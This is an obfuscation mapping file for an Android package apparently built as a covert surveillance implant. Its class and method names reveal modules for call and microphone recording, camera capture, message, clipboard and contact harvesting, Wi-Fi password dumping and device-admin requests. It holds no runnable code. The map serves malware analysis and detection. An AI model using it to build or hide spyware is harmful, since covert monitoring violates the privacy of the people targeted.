android.media.AmrInputStream -> android.media.AmrInputStream:
    327:341:java.lang.Object readMarkupSerializable() -> bn
    347:372:java.io.Serializable unserialize(java.io.Serializable) -> localvar
    378:384:void serialize(java.io.Serializable) -> localclass
com.android.dvci.evidence.Name -> kso.y:
    int progressive -> cK
    java.lang.String basePath -> dj
    java.lang.String blockDir -> dk
    java.lang.String encName -> dl
    java.lang.String fileName -> cD
com.android.dvci.file.AutoFile -> kso.z:
    java.io.File file -> file
    java.lang.String filename -> filename
    73:73:byte[] read() -> bo
    84:115:java.lang.String getFileContents(java.lang.String) -> lua_else
    125:165:byte[] read(int,int) -> localclass
    176:216:byte[] read(int) -> sort
    226:227:void write(byte[]) -> write
    242:266:boolean write$1cf927cf$49634b8b(byte[]) -> lua_nil
    272:273:void write(int) -> write
    282:327:boolean append(byte[]) -> lua_not
    336:336:boolean exists() -> exists
    345:345:boolean canRead() -> canRead
    354:354:boolean isDirectory() -> isDirectory
    366:366:java.lang.String[] list() -> list
    375:375:long getSize() -> getSize
    384:384:java.util.Date getFileTime() -> bp
    388:388:java.lang.String getFilename() -> bq
    392:392:java.lang.String getName() -> getName
    399:407:boolean delete() -> delete
    411:420:boolean dropExtension(java.lang.String) -> lua_elseif
    424:428:void create() -> create
    440:462:boolean rename(java.lang.String) -> lua_end
    466:466:java.lang.String toString() -> toString
    470:470:long lastModified() -> lastModified
    474:483:void chmod(java.lang.String) -> lua_false
com.android.dvci.file.Directory -> kso.A:
    java.lang.String hiddenDirMacro -> dm
    java.lang.String userProfile -> dn
    java.lang.String userDoc -> do
    java.lang.String userPicture -> dp
    36:40:java.lang.String expandMacro(java.lang.String) -> lua_for
    44:48:java.lang.String expandMacro(java.lang.String,java.lang.String,java.lang.String) -> localvar
com.android.dvci.file.Path -> kso.B:
    java.lang.String CONF_DIR -> dq
    java.lang.String MARKUP_DIR -> dr
    java.lang.String LOG_DIR -> ds
    java.lang.String UPLOADS -> dt
    java.lang.String hidden -> du
    byte[] $ -> $
    80:124:boolean makeDirs(boolean) -> quicksort
    133:164:void setStorage(boolean) -> evaluate
    167:167:java.lang.String home() -> br
    176:176:java.lang.String hidden() -> bs
    180:180:java.lang.String doc() -> bt
    184:184:java.lang.String picture() -> bu
    204:204:java.lang.String conf() -> bv
    213:213:java.lang.String markup() -> bw
    222:222:java.lang.String logs() -> bx
    226:227:java.lang.String uploads() -> by
    232:232:boolean unprotect(java.lang.String) -> lua_function
    237:254:boolean unprotect(java.lang.String,int,boolean) -> localvar
    258:289:boolean unprotect(java.lang.String,boolean) -> localvar
    293:297:boolean unprotect$3b99f9ef(java.lang.String,java.lang.String) -> myarray
    301:309:boolean unprotectAll$505cbf47(java.lang.String) -> lua_if
    316:324:boolean lock(java.lang.String) -> lua_in
    335:336:boolean removeDirectory(java.lang.String) -> lua_local
    346:348:boolean createDirectory(java.lang.String) -> lua_nil
    359:373:long freeSpace() -> bz
    385:391:boolean makeDirs() -> bA
    java.lang.String $$24d420ae(int) -> quicksort
com.android.dvci.gui.ASG -> com.android.dvci.gui.ASG:
    android.os.Handler handler -> handler
    51:53:void onCreate(android.os.Bundle) -> onCreate
    58:60:void onStop() -> onStop
    64:65:void onDestroy() -> onDestroy
    69:73:void onResume() -> onResume
    76:124:void actualCreate(android.os.Bundle) -> Code
    140:176:void startService() -> bB
    179:194:void fireAdminIntent() -> bC
    198:201:void onActivityResult(int,int,android.content.Intent) -> onActivityResult
    204:220:void deviceAdminRequest() -> bD
    223:223:android.content.Context getAppContext() -> data_off
com.android.dvci.gui.ASG$1 -> kso.D:
    com.android.dvci.gui.ASG this$0 -> dv
    216:218:void run() -> run
com.android.dvci.interfaces.AbstractFactory -> kso.E:
    com.android.dvci.ThreadBase create$7ab2c0f7(java.lang.String,java.lang.String) -> variables
com.android.dvci.interfaces.IncrementalLog -> kso.F:
    void resetLog() -> bE
com.android.dvci.interfaces.Observer -> kso.G:
    int notification(java.lang.Object) -> Code
com.android.dvci.interfaces.iProtocol -> kso.H:
    boolean init(com.android.dvci.action.sync.Transport) -> Code
    boolean perform() -> ao
com.android.dvci.listener.AR -> com.android.dvci.listener.AR:
    17:23:void onEnabled(android.content.Context,android.content.Intent) -> onEnabled
    28:33:void onDisabled(android.content.Context,android.content.Intent) -> onDisabled
    37:41:void onPasswordChanged(android.content.Context,android.content.Intent) -> onPasswordChanged
    45:49:void onPasswordFailed(android.content.Context,android.content.Intent) -> onPasswordFailed
    53:57:void onPasswordSucceeded(android.content.Context,android.content.Intent) -> onPasswordSucceeded
    62:69:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.dvci.listener.BAc -> kso.I:
    32:47:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.dvci.listener.BC -> kso.J:
    com.android.dvci.Call call -> dw
    38:63:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    67:164:void manageReceive$3b2d1350(android.content.Intent) -> Code
com.android.dvci.listener.BSm -> kso.K:
    36:124:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    130:140:void memorize(java.lang.String,java.lang.String) -> invoked
    146:148:void cleanMemory() -> bF
com.android.dvci.listener.BSm$1 -> kso.L:
    com.android.dvci.module.message.Sms val$sms -> dx
    com.android.dvci.listener.BSm this$0 -> dy
    113:118:void run() -> run
com.android.dvci.listener.BSt -> kso.M:
    32:47:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.dvci.listener.BroadcastMonitorConnectivity -> kso.N:
    boolean stop -> aj
    int period -> dz
    41:71:void run() -> run
    75:76:void onReceive(boolean) -> eval
    79:80:void register() -> bG
    83:85:void unregister() -> unregister
com.android.dvci.listener.BroadcastMonitorSim -> kso.O:
    boolean stop -> aj
    int period -> dz
    35:53:void run() -> run
    57:58:void onReceive(java.lang.String) -> lua_not
    61:62:void register() -> bG
    65:67:void unregister() -> unregister
com.android.dvci.listener.Listener -> kso.P:
    java.util.ArrayList observers$7865b31 -> dA
    boolean suspended -> Q
    java.lang.Object suspendLock -> dB
    33:42:boolean attach(com.android.dvci.interfaces.Observer) -> Code
    46:55:void detach(com.android.dvci.interfaces.Observer) -> localvar
    66:77:int dispatch(java.lang.Object) -> localvar
    84:93:void suspend() -> suspend
    100:109:void resume() -> resume
    122:124:void setSuspended(boolean) -> fingerprint
    void start() -> start
    void stop() -> stop
com.android.dvci.listener.ListenerAc -> kso.Q:
    com.android.dvci.listener.BAc acReceiver -> dC
    com.android.dvci.listener.ListenerAc singleton -> dD
    33:41:com.android.dvci.listener.ListenerAc self() -> bH
    46:47:void start() -> start
    51:52:void stop() -> stop
    58:67:void registerAc() -> bI
com.android.dvci.listener.ListenerBattery -> kso.R:
    com.android.dvci.listener.ListenerBattery$1 batteryReceiver$48665ecd -> dE
    com.android.dvci.listener.ListenerBattery singleton -> dF
    38:46:com.android.dvci.listener.ListenerBattery self() -> bJ
    51:81:void start() -> start
    85:86:void stop() -> stop
com.android.dvci.listener.ListenerBattery$1 -> kso.S:
    int scale -> localclass
    int level -> level
    int voltage -> variables
    int temp -> dG
    com.android.dvci.listener.ListenerBattery this$0 -> dH
    byte[] $ -> $
    59:72:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $$24d420ae() -> method_ids
com.android.dvci.listener.ListenerCall -> kso.T:
    com.android.dvci.listener.BC callReceiver -> dI
    com.android.dvci.listener.ListenerCall singleton -> dJ
    29:37:com.android.dvci.listener.ListenerCall self() -> bK
    42:43:void start() -> start
    48:48:void stop() -> stop
    54:55:void registerCall() -> bL
    59:59:int dispatch(com.android.dvci.Call) -> localvar
    14:14:int dispatch(java.lang.Object) -> localvar
com.android.dvci.listener.ListenerConnectivity -> kso.U:
    com.android.dvci.listener.BroadcastMonitorConnectivity connectivityReceiver -> dK
    com.android.dvci.listener.ListenerConnectivity singleton -> dL
    29:37:com.android.dvci.listener.ListenerConnectivity self() -> bM
    42:43:void start() -> start
    47:48:void stop() -> stop
    54:57:void registerConnectivity() -> bN
com.android.dvci.listener.ListenerProcess -> kso.V:
    java.lang.String lastForeground -> dM
    boolean started -> started
    com.android.dvci.listener.ListenerProcess$BroadcastMonitorProcess bmp -> dN
    java.lang.Object standbyLock -> dO
    java.lang.Object startedLock -> dP
    com.android.dvci.listener.ListenerProcess singleton -> dQ
    java.util.concurrent.ScheduledFuture future -> dR
    java.util.concurrent.ScheduledExecutorService stpe -> dS
    55:63:com.android.dvci.listener.ListenerProcess self() -> bO
    78:99:void start() -> start
    105:123:void stop() -> stop
    133:144:int dispatch(java.lang.String) -> lua_or
    150:166:int notification(com.android.dvci.Standby) -> Code
    31:31:int notification(java.lang.Object) -> Code
com.android.dvci.listener.ListenerProcess$BroadcastMonitorProcess -> kso.V$Code:
    com.android.dvci.listener.ListenerProcess this$0 -> dT
    180:185:void run() -> run
com.android.dvci.listener.ListenerSim -> kso.W:
    com.android.dvci.listener.BroadcastMonitorSim simReceiver -> dU
    com.android.dvci.listener.ListenerSim singleton -> dV
    29:37:com.android.dvci.listener.ListenerSim self() -> bP
    42:43:void start() -> start
    47:48:void stop() -> stop
    54:57:void registerSim() -> bQ
com.android.dvci.listener.ListenerSms -> kso.X:
    com.android.dvci.listener.BSm smsReceiver -> dW
    com.android.dvci.listener.ListenerSms singleton -> dX
    29:37:com.android.dvci.listener.ListenerSms self() -> bR
    42:43:void start() -> start
    48:48:void stop() -> stop
    54:55:void registerSms() -> bS
com.android.dvci.listener.ListenerStandby -> kso.Y:
    com.android.dvci.listener.BSt standbyReceiver -> dY
    com.android.dvci.listener.ListenerStandby singleton -> dZ
    35:43:com.android.dvci.listener.ListenerStandby self() -> bT
    48:49:void start() -> start
    53:54:void stop() -> stop
    60:70:void registerAc() -> bI
    73:75:boolean isScreenOn() -> isScreenOn
com.android.dvci.listener.WR -> kso.Z:
    19:67:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.dvci.manager.Manager -> kso.aa:
    java.util.HashMap instances -> ea
    java.util.HashMap threads -> eb
    com.android.dvci.Status status -> ah
    com.android.dvci.interfaces.AbstractFactory factory -> ec
    50:51:void setFactory(com.android.dvci.interfaces.AbstractFactory) -> Code
    54:54:com.android.dvci.ThreadBase get$7864f3a2(java.lang.String) -> lua_repeat
com.android.dvci.manager.ManagerEvent -> kso.ab:
    com.android.dvci.manager.ManagerEvent singleton -> ed
    byte[] $ -> $
    36:45:com.android.dvci.manager.ManagerEvent self() -> bU
    58:92:com.android.dvci.event.BaseEvent createEvent(java.lang.String,com.android.dvci.conf.ConfEvent) -> Code
    102:127:boolean startAll() -> bV
    135:157:void stopAll() -> lua_end
    161:190:void start(java.lang.Integer) -> Code
    194:245:void stop(java.lang.Integer) -> localvar
    248:256:void enable(int) -> evaluate
    259:267:void disable(int) -> eval
    java.lang.String $(int,int,int) -> $
com.android.dvci.manager.ManagerModule -> kso.ac:
    com.android.dvci.manager.ManagerModule singleton -> ee
    39:48:com.android.dvci.manager.ManagerModule self() -> bW
    97:120:void stopAll() -> lua_end
    129:180:void start(java.lang.String,com.android.dvci.Trigger) -> Code
    183:193:com.android.dvci.module.BaseModule makeAgent(java.lang.String) -> lua_return
    201:201:boolean isInstancedAgent(java.lang.Class) -> Code
    205:205:com.android.dvci.module.BaseModule getInstancedAgent(java.lang.Class) -> localvar
    216:243:void stop(java.lang.String) -> lua_then
    252:259:void resetIncrementalLogs() -> bX
    268:269:java.lang.String getType(java.lang.Class) -> localclass
com.android.dvci.module.BaseInstantModule -> kso.ad:
    11:27:void run() -> run
    32:32:void actualGo() -> L
    37:37:void actualStop() -> N
com.android.dvci.module.BaseModule -> kso.ae:
    com.android.dvci.conf.ChildConf conf$673c8cc3 -> ef
    com.android.dvci.Trigger trigger -> eg
    boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    37:37:java.lang.String getType() -> getType
    44:45:boolean setConf$7813568a(com.android.dvci.conf.ChildConf) -> localclass
    50:50:java.lang.String toString() -> toString
    54:55:void setTrigger(com.android.dvci.Trigger) -> localvar
    62:62:void notifyProcess(com.android.dvci.ProcessInfo) -> localvar
com.android.dvci.module.FactoryModule -> kso.af:
    java.util.Hashtable factorymap -> eh
    java.util.Hashtable typemap -> ei
    52:55:java.lang.String getType(java.lang.Class) -> localclass
    71:87:com.android.dvci.module.BaseModule create$58731065(java.lang.String) -> lua_true
    20:20:com.android.dvci.ThreadBase create$7ab2c0f7(java.lang.String,java.lang.String) -> variables
com.android.dvci.module.ModuleAddressBook -> kso.ag:
    com.android.dvci.module.task.PickContact contact -> ej
    com.android.dvci.evidence.Markup markupContacts -> ek
    java.util.HashMap contacts -> el
    java.lang.String observe -> em
    java.lang.String myPhone -> en
    67:67:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    76:113:void actualStart() -> M
    126:167:void actualGo() -> L
    171:172:void actualStop() -> N
    187:200:void serializeContacts() -> bY
    203:240:boolean contacts() -> bZ
    245:258:boolean serializeIfNew(long,byte[]) -> Code
    268:284:byte[] preparePacket(com.android.dvci.module.task.Contact) -> Code
    291:310:byte[] preparePacket(int,long,java.lang.String,java.lang.String,java.lang.String) -> Code
    314:333:java.io.ByteArrayOutputStream prepareHeader(long,int,int) -> Code
    337:356:void addTypedString(java.io.ByteArrayOutputStream,byte,java.lang.String) -> Code
    360:375:int notification$17a49ab7() -> ca
    379:380:void createEvidenceLocal(int,java.lang.String) -> localvar
    388:405:void createEvidenceLocal(int,java.lang.String,java.lang.String) -> Code
    409:422:boolean createEvidenceRemote(int,com.android.dvci.module.chat.Contact) -> Code
    426:426:com.android.dvci.module.ModuleAddressBook getInstance() -> cb
    36:36:int notification(java.lang.Object) -> Code
com.android.dvci.module.ModuleAddressBook$1 -> kso.ah:
    com.android.dvci.module.ModuleAddressBook this$0 -> eo
    135:145:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.ModuleApplication -> kso.ai:
    com.android.dvci.evidence.EvidenceBuilder evidenceIncremental -> ep
    34:34:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    40:40:void actualGo() -> L
    47:49:void actualStart() -> M
    53:56:void actualStop() -> N
    59:60:int notification(com.android.dvci.ProcessInfo) -> Code
    74:92:void saveEvidence(java.lang.String,com.android.dvci.ProcessStatus) -> Code
    103:107:void resetLog() -> bE
    29:29:int notification(java.lang.Object) -> Code
com.android.dvci.module.ModuleCalendar -> kso.aj:
    com.android.dvci.evidence.Markup markupCalendar -> eq
    java.util.HashMap calendar -> er
    55:55:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    64:90:void actualStart() -> M
    94:103:int notification(com.android.dvci.ProcessInfo) -> Code
    108:109:void actualStop() -> N
    122:134:void actualGo() -> L
    146:159:void serializeCalendar() -> cc
    173:287:boolean calendar() -> cd
    296:324:java.util.Hashtable selectCalendars(java.lang.String) -> lua_until
    330:335:android.database.Cursor managedQuery$5eb44419(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String) -> Code
    346:350:void saveEvidenceCalendar$487efef6(byte[]) -> lua_or
    354:427:byte[] preparePacket(long,java.lang.String,java.lang.String,java.lang.String,java.util.Date,java.util.Date,java.lang.String,java.lang.Boolean) -> Code
    431:438:void appendCalendarString(java.io.ByteArrayOutputStream,int,java.lang.String) -> Code
    32:32:int notification(java.lang.Object) -> Code
com.android.dvci.module.ModuleCall -> kso.ak:
    boolean recordFlag -> es
    com.android.dvci.module.ModuleCall$1 observer$5714f4ea -> et
    java.lang.Thread queueMonitor -> eu
    java.lang.Object sync -> ev
    java.util.concurrent.LinkedBlockingQueue calls$19f590b5 -> ew
    com.android.dvci.module.call.EncodingTask encodingTask -> ex
    com.android.dvci.util.CallBack hjcb -> ey
    com.android.dvci.util.Instrument hijack -> ez
    byte[] AMR_HEADER -> eA
    int[] amr_sizes -> eB
    com.android.dvci.RunningProcesses runningProcesses -> eC
    com.android.dvci.module.call.CallInfo callInfo -> eD
    java.util.ArrayList chunks$7865b31 -> eE
    boolean[] finished -> eF
    boolean canRecord -> eG
    java.lang.Object recordingLock -> eH
    boolean started -> started
    101:101:com.android.dvci.module.ModuleCall self() -> ce
    106:118:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    124:124:void actualGo() -> L
    128:184:void actualStart() -> M
    188:211:boolean installedWhitelist() -> cf
    217:237:void actualStop() -> N
    240:293:void startWatchAudio() -> cg
    298:324:boolean installHijack() -> ch
    329:362:void purgeAudio() -> ci
    366:386:void scrubAudio() -> cj
    390:412:boolean addToEncodingList(java.lang.String) -> lua_while
    425:458:int notification(com.android.dvci.Call) -> Code
    469:512:boolean saveCallEvidence(java.lang.String,java.lang.String,boolean,java.util.Date,java.util.Date,java.lang.String,boolean,int,int) -> Code
    518:526:void closeCallEvidence$66c2d4f6(java.lang.String,java.lang.String,java.util.Date,java.util.Date,int) -> Code
    529:544:int checkIntegrity(byte[]) -> lua_repeat
    560:599:byte[] getCallAdditionalData(java.lang.String,java.lang.String,boolean,com.android.dvci.util.DateTime,com.android.dvci.util.DateTime,int,int) -> Code
    608:641:void saveCalllistEvidence$4b0c3ab0(java.lang.String,java.lang.String,boolean,java.util.Date,int) -> Code
    670:820:void encodeChunks(com.android.dvci.file.AutoFile) -> localclass
    825:831:long getStreamId(java.lang.String) -> header
    837:845:int getStreamPid(java.lang.String) -> string_ids
    849:854:void sort_chunks() -> ck
    857:859:void saveCallEvidence(java.lang.String,java.lang.String,com.android.dvci.module.call.Chunk,int) -> Code
    866:884:void saveAllEvidences$46121fba(java.util.ArrayList,com.android.dvci.module.call.CallInfo,java.util.Date,java.util.Date) -> Code
    901:901:boolean canRecord() -> cl
    60:60:int notification(java.lang.Object) -> Code
    60:60:boolean access$000(com.android.dvci.module.ModuleCall,java.lang.String) -> Code
    60:60:com.android.dvci.module.call.EncodingTask access$100(com.android.dvci.module.ModuleCall) -> Code
com.android.dvci.module.ModuleCall$1 -> kso.al:
    com.android.dvci.module.ModuleCall this$0 -> eI
    271:289:void onEvent(int,java.lang.String) -> onEvent
com.android.dvci.module.ModuleCall$2 -> kso.am:
    com.android.dvci.module.ModuleCall this$0 -> eI
    333:333:boolean accept(java.io.File,java.lang.String) -> accept
com.android.dvci.module.ModuleCall$3 -> kso.an:
    com.android.dvci.module.ModuleCall this$0 -> eI
    370:370:boolean accept(java.io.File,java.lang.String) -> accept
com.android.dvci.module.ModuleCall$4 -> kso.ao:
    com.android.dvci.module.ModuleCall this$0 -> eI
    851:851:int compare(com.android.dvci.module.call.Chunk,com.android.dvci.module.call.Chunk) -> Code
    849:849:int compare(java.lang.Object,java.lang.Object) -> compare
com.android.dvci.module.ModuleCall$HC -> kso.ak$Code:
    com.android.dvci.module.ModuleCall this$0 -> eI
    208:218:java.lang.String chomp(java.lang.String,java.lang.String) -> zygoteapp
    232:249:java.lang.String unspace(java.lang.String) -> type_ids
    253:253:boolean isEmpty(java.lang.String) -> proto_ids
    257:266:java.lang.String join$68fb8953(java.util.List,java.lang.String) -> Code
    274:283:java.lang.String join$965d9d1(java.lang.String[],java.lang.String) -> Code
    309:342:java.util.ArrayList readFileLines$3ff9fd98(java.lang.String) -> field_ids
    346:346:java.lang.String[] split(java.lang.String) -> split
com.android.dvci.module.ModuleCamera -> kso.ap:
    int counter -> eJ
    57:57:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    71:78:void actualStart() -> M
    91:106:void snapshot() -> cm
    112:113:void callback(byte[]) -> lua_return
com.android.dvci.module.ModuleChat -> kso.aq:
    com.android.dvci.module.SubModuleManager subModuleManager -> eK
    56:65:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    71:72:void actualGo() -> L
    81:83:void actualStart() -> M
    90:92:void actualStop() -> N
    99:129:void saveEvidence(java.util.ArrayList) -> inst
    136:136:int notification(com.android.dvci.ProcessInfo) -> Code
    29:29:int notification(java.lang.Object) -> Code
com.android.dvci.module.ModuleClipboard -> kso.ar:
    android.text.ClipboardManager clipboardManager -> eL
    java.lang.String lastClip -> eM
    41:41:void actualStart() -> M
    45:46:void actualStop() -> N
    50:51:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    57:68:void actualGo() -> L
    71:100:void getClipboard() -> cn
    103:128:void saveEvidence(java.lang.String) -> method_ids
    137:137:void resetLog() -> bE
    31:31:void access$000(com.android.dvci.module.ModuleClipboard) -> Code
com.android.dvci.module.ModuleClipboard$1 -> kso.as:
    com.android.dvci.module.ModuleClipboard this$0 -> eN
    65:66:void run() -> run
com.android.dvci.module.ModuleCrisis -> kso.at:
    40:42:void actualStart() -> M
    46:48:void actualStop() -> N
    53:81:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    86:86:void actualGo() -> L
com.android.dvci.module.ModuleDevice -> kso.au:
    boolean processList -> eO
    float cpuUsage -> eP
    long cpuTotal -> eQ
    long cpuIdle -> eR
    byte[] $ -> $
    95:95:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    106:158:void actualStart() -> M
    161:170:void getProcessList(java.lang.StringBuffer) -> Code
    173:182:void getProperties(java.lang.StringBuffer) -> localvar
    186:229:long getSystem(java.lang.StringBuffer) -> localclass
    233:260:int getBattery(java.lang.StringBuffer) -> instance
    268:291:void readCpuUsage() -> co
    java.lang.String $$24d420ae() -> method_ids
com.android.dvci.module.ModuleMessage -> kso.av:
    boolean mailEnabled -> eS
    boolean smsEnabled -> eT
    boolean mmsEnabled -> eU
    com.android.dvci.module.message.MsgHandler msgHandler -> eV
    com.android.dvci.evidence.Markup storedMMS -> eW
    com.android.dvci.evidence.Markup storedSMS -> eX
    com.android.dvci.evidence.Markup storedMAIL -> eY
    com.android.dvci.evidence.Markup configMarkup -> eZ
    java.util.Hashtable lastMail -> fa
    int lastMMS -> fb
    int lastSMS -> fc
    com.android.dvci.module.message.Filter[] filterCollect -> fd
    com.android.dvci.module.message.Filter[] filterRuntime -> fe
    com.android.dvci.module.ModuleMessage$ProcessMailObserver obs -> ff
    java.util.concurrent.Semaphore stillReadingEmail -> fg
    90:161:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    165:188:boolean readJson$13ded6b2(int,java.lang.String,com.android.dvci.conf.ChildConf,java.lang.String[]) -> Code
    225:246:void actualStart() -> M
    251:266:void actualStop() -> N
    271:290:void actualGo() -> L
    293:297:void initMail() -> cp
    300:305:void initSms() -> cq
    308:323:void initMms() -> cr
    327:334:void updateMarkupMMS(int) -> fingerprint
    340:342:void updateMarkupSMS(int) -> openfile
    349:362:void updateMarkupMail(java.lang.String,int,boolean) -> localclass
    367:400:java.lang.String[] getMailStores(java.lang.String) -> class_defs
    405:454:int readHistoricMail(java.util.Hashtable) -> Code
    458:480:int readHistoricMms(int) -> closefile
    488:504:int readHistoricSms(int) -> constants
    508:516:void saveSms(com.android.dvci.module.message.Sms) -> localvar
    519:536:void saveMms(com.android.dvci.module.message.Mms) -> Code
    540:547:boolean saveEmail(com.android.dvci.module.email.Email) -> Code
    552:577:void saveEvidenceEmail(com.android.dvci.module.email.Email,java.lang.String) -> Code
    585:609:boolean saveEvidenceSms(java.lang.String,byte[],long,boolean) -> Code
    614:615:int notification(com.android.dvci.module.message.Sms) -> Code
    620:624:int notification(com.android.dvci.module.message.Mms) -> localvar
    628:628:int getLastManagedMmsId() -> cs
    635:635:int getLastManagedSmsId() -> ct
    60:60:int notification(java.lang.Object) -> Code
    60:60:java.util.Hashtable access$000(com.android.dvci.module.ModuleMessage) -> Code
    60:60:int access$100(com.android.dvci.module.ModuleMessage,java.util.Hashtable) -> Code
com.android.dvci.module.ModuleMessage$1 -> kso.aw:
    com.android.dvci.module.ModuleMessage this$0 -> fh
    377:377:boolean accept(java.io.File,java.lang.String) -> accept
com.android.dvci.module.ModuleMessage$2 -> kso.ax:
    com.android.dvci.module.ModuleMessage this$0 -> fh
    391:391:boolean accept(java.io.File,java.lang.String) -> accept
com.android.dvci.module.ModuleMessage$ProcessMailObserver -> kso.av$Code:
    java.lang.String pObserving -> fi
    com.android.dvci.module.ModuleMessage this$0 -> fh
    201:215:int notification(com.android.dvci.ProcessInfo) -> Code
    191:191:int notification(java.lang.Object) -> Code
com.android.dvci.module.ModuleMic -> kso.ay:
    byte[] AMR_HEADER -> eA
    com.android.dvci.module.StandByObserver standbyObserver -> fj
    int[] amr_sizes -> eB
    android.media.MediaRecorder recorder -> bV
    int numFailures -> fk
    long fId -> fl
    android.net.LocalSocket receiver -> fm
    android.net.LocalServerSocket lss -> fn
    android.net.LocalSocket sender -> fo
    java.io.InputStream is -> fp
    java.lang.String socketname -> fq
    boolean phoneListening -> fr
    com.android.dvci.module.ProcessObserver processObserver$1094ee4d -> fs
    java.util.HashSet blacklist$5a95723b -> ft
    boolean allowResume -> fu
    int index -> index
    byte[] unfinished -> fv
    boolean callOngoing -> fw
    94:100:void resetBlacklist() -> cu
    103:104:void addBlacklist(java.lang.String) -> data
    107:107:com.android.dvci.module.ModuleMic self() -> cv
    117:119:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    135:167:void actualStart() -> M
    170:176:void startRecord() -> cw
    195:204:void actualStop() -> N
    217:262:void actualGo() -> L
    265:274:void addPhoneListener() -> cx
    277:283:void removePhoneListener() -> cy
    288:309:void notifyProcess(com.android.dvci.ProcessInfo) -> localvar
    317:427:void saveRecorderEvidence() -> cz
    430:457:byte[] getAvailable() -> cA
    470:501:void startRecorder() -> cB
    504:524:void createSockets() -> cC
    528:545:void deleteSockets() -> cD
    558:579:void stopRecorder() -> cE
    582:599:byte[] getAdditionalData() -> cF
    603:617:int notification(com.android.dvci.Call) -> Code
    621:632:int notification(com.android.dvci.Standby) -> Code
    636:645:boolean isForegroundBlacklist() -> cG
    650:662:void suspend() -> suspend
    665:685:boolean canRecordMic() -> cH
    691:719:void resume() -> resume
    725:725:void onInfo(android.media.MediaRecorder,int,int) -> onInfo
    732:733:void onError(android.media.MediaRecorder,int,int) -> onError
    739:742:void stop() -> stop
    55:55:int notification(java.lang.Object) -> Code
com.android.dvci.module.ModulePassword -> kso.az:
    com.android.dvci.evidence.Markup markupPassword -> fx
    java.util.HashMap lastPasswords -> fy
    java.util.HashMap services -> fz
    35:50:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    60:65:void actualStart() -> M
    73:125:void actualGo() -> L
    133:169:boolean dumpWifi(java.lang.String) -> link_data
    174:178:java.lang.String getValue(java.lang.String) -> getValue
    185:223:void dumpAccounts$459b9629(com.android.dvci.module.ModuleAddressBook$1) -> Code
    233:240:java.lang.String getService(java.lang.String) -> magic
    246:254:int getServiceId(java.lang.String) -> checksum
    261:261:void actualStop() -> N
    264:269:void addToEvidence(com.android.dvci.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> Code
    25:25:java.util.HashMap access$000(com.android.dvci.module.ModulePassword) -> Code
    25:25:com.android.dvci.evidence.Markup access$100(com.android.dvci.module.ModulePassword) -> localvar
    25:25:java.lang.String access$200(java.lang.String) -> signature
    25:25:void access$300$3319e86f(com.android.dvci.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> localvar
com.android.dvci.module.ModulePassword$1 -> kso.aA:
    com.android.dvci.evidence.EvidenceBuilder evidence -> fA
    boolean needToSerialize -> fB
    com.android.dvci.module.ModulePassword this$0 -> fC
    79:83:void close() -> close
    87:113:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.ModulePosition -> kso.aB:
    boolean gpsEnabled -> fD
    boolean cellEnabled -> fE
    boolean wifiEnabled -> fF
    java.lang.Object position -> fG
    boolean scanning -> fH
    com.android.dvci.module.ModulePosition$1 wifiReceiver$48665ecd -> fI
    65:92:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
